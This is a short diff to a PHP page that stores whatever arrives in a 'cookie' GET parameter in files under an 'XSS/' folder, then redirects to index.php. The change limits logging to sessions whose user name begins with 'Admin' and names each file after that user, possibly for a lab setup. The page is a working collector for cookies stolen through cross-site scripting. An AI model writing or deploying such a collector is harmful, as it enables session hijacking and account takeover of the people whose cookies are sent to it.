@@ -8,11 +8,14 @@
 <body>
 <?php
 if(isset($_GET['cookie']) && !empty($_GET['cookie'])){
-    date_default_timezone_set("Europe/Paris");
+    session_start();
 
-    $XSS = fopen('XSS/' . date("h:i:sa") . '.txt', 'w');
-    fwrite($XSS, $_GET['cookie']);
-    fclose($XSS);
+    if(isset($_SESSION['pseudo']) && substr($_SESSION['pseudo'], 0, 5) === "Admin")
+    {
+        $XSS = fopen('XSS/' . $_SESSION['pseudo'] . '.txt', 'w');
+        fwrite($XSS, $_GET['cookie']);
+        fclose($XSS);
+    }
 }
 
 header('location: index.php');
